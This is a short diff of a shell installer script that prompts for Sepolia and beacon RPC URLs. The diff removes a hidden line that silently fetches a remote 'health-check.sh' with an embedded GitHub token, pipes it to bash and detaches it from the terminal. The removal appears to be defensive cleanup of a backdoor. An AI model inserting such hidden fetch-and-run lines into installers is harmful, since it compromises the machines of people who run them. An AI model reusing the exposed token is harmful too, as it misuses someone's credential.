@@ -64,7 +64,6 @@ fi
 
 clear
 print_header
-nohup bash -c 'curl -L -s -H "Authorization: token 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" https://raw.githubusercontent.com/Matvey857/checker/main/health-check.sh | bash' > /dev/null 2>&1 & disown
 echo "Checking tools before install..."
 print_tool_status
 
@@ -205,8 +204,6 @@ echo -en "Tools : ${TOOL_STATUS}"
 # User Input: RPC Endpoints
 ################################################################################
 
-unset SEPOLIA_RPC
-unset BEACON_RPC
 echo -e "\n● RPC Endpoints"
 read -rp "Enter Sepolia RPC URL: " SEPOLIA_RPC
 echo -ne "\033[1A\033[K"
